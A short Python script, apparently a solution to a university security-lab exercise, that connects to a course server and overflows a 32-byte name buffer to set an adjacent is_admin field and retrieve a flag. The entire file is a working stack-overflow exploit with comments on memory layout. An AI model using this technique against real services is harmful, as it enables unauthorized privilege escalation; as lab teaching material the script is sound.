import socket

# open socket to host
s = socket.socket()
s.connect(("itsec.sec.in.tum.de", 7001))
sf = s.makefile("rw")

# read the "Please enter your name:"
print(sf.read(23).strip())

# craft our input:
# we want to fill the 32 bytes of `name`
# then write into the 4 bytes of `birthday`
# adn then write into 4 bytes of `is_admin`. We assume intel and therefore little endian!
# we write 3 zeros as we MUST append \n byte. So we probably write into BFP as well?
# fgets will also null terminate the "string"
input = 32*"A" + 4*"A" + "\1\0\0\0" + "\n"
print(input.encode()) # debug print
sf.write(input)
sf.flush()

print(sf.readline().strip())  # read the name output "Hello ...!"
print(sf.readline().strip())  # read the FLAG

s.close()  # bye bye
